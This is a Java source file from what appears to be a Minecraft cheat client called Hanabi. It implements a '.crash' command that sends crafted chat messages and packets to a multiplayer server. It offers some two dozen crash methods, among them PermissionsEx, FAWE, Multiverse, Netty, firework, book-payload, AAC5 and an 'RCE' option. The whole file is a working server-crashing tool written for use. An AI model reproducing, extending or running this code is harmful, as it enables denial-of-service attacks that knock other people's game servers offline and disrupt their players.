package cn.hanabi.command.commands;


import cn.hanabi.Hanabi;
import cn.hanabi.command.Command;
import cn.hanabi.gui.classic.notifications.Notification;
import cn.hanabi.utils.client.ClientUtil;
import cn.hanabi.utils.crasher.CrashUtils;
import cn.hanabi.utils.game.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.network.Packet;
import net.minecraft.network.play.client.C01PacketChatMessage;
import net.minecraft.network.play.client.C03PacketPlayer;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Random;

public class CrashCommand extends Command {

    public static String[] crashType = new String[]{"MV", "Fawe", "Pex", "Position", "Payload", "Netty",
            "Place", "Click", "Create", "Cap", "Place2", "Place3", "Click2", "Click3", "NettyP", "NettyPL", "NettyC", "AAC5",
            "FWP", "FWC", "FWCreate", "FWP2", "FWP3", "FWC2", "FWC3", "Action", "Action2", "RCE"};
    CrashUtils crashUtils = new CrashUtils();

    int bookType, bookvalue, redo, resolvebyte, json;

    public CrashCommand() {
        super("crash", "c", "rip");
    }

    @Override
    public void run(String alias, String[] args) {
        if (args.length < 1) {
            ClientUtil.sendNotification(new Notification(".crash method/list amount delay type value redo resolveByte bypass", Notification.Type.INFO));
            return;
        }

        int amounts = 5;
        String CrashType = args[0];

        if (args.length > 1)
            amounts = Integer.parseInt(args[1]);

        int value = amounts;


        if (Minecraft.getMinecraft().isSingleplayer()) {
            ClientUtil.sendNotification(new Notification("You are in Single Game!", Notification.Type.ERROR));
        } else {
            try {
                Hanabi.INSTANCE.timing = args.length > 2 ? Long.parseLong(args[2]) : 0L;

                if (args.length > 5) {
                    bookType = Integer.parseInt(args[3]);
                    bookvalue = Integer.parseInt(args[4]);
                    redo = Integer.parseInt(args[5]);
                    if (args.length > 7) {
                        resolvebyte = Integer.parseInt(args[6]);
                        json = Integer.parseInt(args[7]);
                    } else {
                        resolvebyte = 1;
                        json = 0;
                    }
                } else {
                    bookType = 0;
                    bookvalue = 800;
                    redo = 5;
                    resolvebyte = 1;
                    json = 0;
                }


                Hanabi.INSTANCE.packetQueue.clear();

                ChatUtils.info(bookType + " " + bookvalue + " " + redo + " " + resolvebyte + " " + json + " ");

                switch (CrashType.toLowerCase()) {
                    case "pex": //Pex (outdated)
                        sendPacket(new C01PacketChatMessage(crashUtils.pexcrashexp1));
                        sendPacket(new C01PacketChatMessage(crashUtils.pexcrashexp2));
                        break;
                    case "fawe": //Old Fawe  (outdated)
                        sendPacket(new C01PacketChatMessage(crashUtils.fawe));
                        break;
                    case "mv": //Mv (outdated)
                        sendPacket(new C01PacketChatMessage(crashUtils.mv));
                        break;
                    case "position":
                        crashUtils.custombyte(value);
                        break;
                    case "payload":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, 833, 1, json, CrashUtils.CrashType.PAYLOAD1, amounts, 1);
                        break;
                    case "payload2":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PAYLOAD2, amounts, resolvebyte);
                        break;
                    case "place":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PLACE, amounts, resolvebyte);
                        break;
                    case "click":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CLICK, amounts, resolvebyte);
                        break;
                    case "create":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CREATE, amounts, resolvebyte);
                        break;
                    case "cap":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CAP, amounts, resolvebyte);
                        break;
                    case "netty":
                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, 2, CrashUtils.CrashType.CLICK, amounts, resolvebyte);
                        break;
                    case "nettyp":
                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, 2, CrashUtils.CrashType.PLACE3, amounts, resolvebyte);
                        break;
                    case "nettypl":
                        crashUtils.crashdemo("/n", bookType, bookvalue, redo, 2, CrashUtils.CrashType.PAYLOAD1, amounts, resolvebyte);
                        break;
                    case "nettyc":
                        crashUtils.crashdemo(crashUtils.netty, bookType, bookvalue, redo, 2, CrashUtils.CrashType.CREATE, amounts, resolvebyte);
                        break;
                    case "place2":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PLACE2, amounts, resolvebyte);
                        break;
                    case "place3":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.PLACE3, amounts, resolvebyte);
                        break;
                    case "click2":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CLICK2, amounts, resolvebyte);
                        break;
                    case "click3":
                        crashUtils.crashdemo(crashUtils.unicode[new Random().nextInt(31)], bookType, bookvalue, redo, json, CrashUtils.CrashType.CLICK3, amounts, resolvebyte);
                        break;
                    case "fwc":
                        crashUtils.firework(amounts, CrashUtils.CrashType.CLICK);
                        break;
                    case "fwc2":
                        crashUtils.firework(amounts, CrashUtils.CrashType.CLICK2);
                        break;
                    case "fw3":
                        crashUtils.firework(amounts, CrashUtils.CrashType.CLICK3);
                        break;
                    case "fwp":
                        crashUtils.firework(amounts, CrashUtils.CrashType.PLACE);
                        break;
                    case "fwp2":
                        crashUtils.firework(amounts, CrashUtils.CrashType.PLACE2);
                        break;
                    case "fwp3":
                        crashUtils.firework(amounts, CrashUtils.CrashType.PLACE3);
                        break;
                    case "fwcreate":
                        crashUtils.firework(amounts, CrashUtils.CrashType.CREATE);
                        break;
                    case "action":
                        crashUtils.actioncrash(amounts, bookType);
                        break;
                    case "action2":
                        crashUtils.action2crash(amounts, bookType);
                        break;
                    case "aac5":
                        crashUtils.aac5crash(amounts);
                        break;
                    case "rce":
                        crashUtils.rce(amounts);
                        break;
                    case "ir":
                        for (int i = 0; i < 24; i++) {
                            sendPacket(new C03PacketPlayer.C05PacketPlayerLook(0, (float) 0.3919237719237813132871932671312378908, true));
                        }
                        break;
                    case "list":
                        ChatUtils.send(Arrays.toString(crashType));
                        break;
                    default:
                        ChatUtils.send("This type doesn't exist.");
                }
                ClientUtil.sendClientMessage("Successfully added" + "  " + CrashType, Notification.Type.SUCCESS);
            } catch (Throwable ignore) {
                ClientUtil.sendClientMessage("Failed to crash" + " " + CrashType, Notification.Type.SUCCESS);
            }
        }

    }

    @Override
    public List<String> autocomplete(int arg, String[] args) {
        boolean flag = false;

        try {
            if (arg == 0) {
                flag = true;
            } else if (arg == 1) {
                flag = true;
            }
        } catch (Exception e) {
            // TODO: handle exception
        }

        ArrayList<String> crashtype = new ArrayList<>(Arrays.asList(crashType));

        if (flag) {
            return crashtype;
        } else return new ArrayList<>();
    }

    private void sendPacket(Packet<?> packet) {
        Minecraft.getMinecraft().getNetHandler().getNetworkManager().sendPacket(packet);
    }
}
